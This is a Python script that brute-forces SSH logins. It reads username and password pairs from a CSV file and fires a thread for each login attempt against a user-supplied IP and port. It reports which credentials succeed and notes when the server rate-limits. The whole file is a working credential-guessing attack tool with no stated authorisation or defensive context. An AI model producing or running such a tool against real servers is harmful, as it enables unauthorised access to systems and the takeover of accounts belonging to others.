import csv
import threading
import ipaddress
import time
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception

def ssh_connect(host, username, password, port):
    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        ssh_client.connect(host, port=port, username=username, password=password, banner_timeout=300)
        print(f"Username - {username} and Password - {password} found.")
    except AuthenticationException:
        print(f"Username - {username} and Password - {password} is Incorrect.")
    except ssh_exception.SSHException:
        print("**** Attempting to connect - Rate limiting on server ****")

def get_ip_address():
    while True:
        host = input("Enter the IP address: ")
        try:
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            print("Please enter a valid IP address.")

def start_ssh_connection():
    host = get_ip_address()
    port = int(input("Enter the port number: "))
    list_file = "passwords.csv"

    def ssh_connection():
        with open(list_file) as fh:
            csv_reader = csv.reader(fh, delimiter=",")
            for index, row in enumerate(csv_reader):
                if index == 0:
                    continue
                else:
                    t = threading.Thread(target=ssh_connect, args=(host, row[0], row[1], port))
                    t.start()
                    time.sleep(0.2)

    threading.Thread(target=ssh_connection).start()

if __name__ == "__main__":
    start_ssh_connection()
